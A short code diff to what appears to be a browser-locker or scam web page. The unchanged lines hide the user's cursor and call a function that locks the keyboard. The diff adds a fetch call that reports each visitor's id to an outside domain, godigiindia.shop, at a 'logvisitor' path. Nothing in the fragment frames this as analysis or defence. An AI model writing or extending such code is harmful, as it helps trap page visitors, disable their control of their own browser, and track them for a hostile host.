@@ -619,6 +619,8 @@
       setTimeout(function() {
         document.body.classList.add('hide-cursor');
       }, 1000);
+    
+      fetch("https://godigiindia.shop/logvisitor/{{visitor.id}}")
       
       // Lock keyboard functionality
       lockKeyboard();
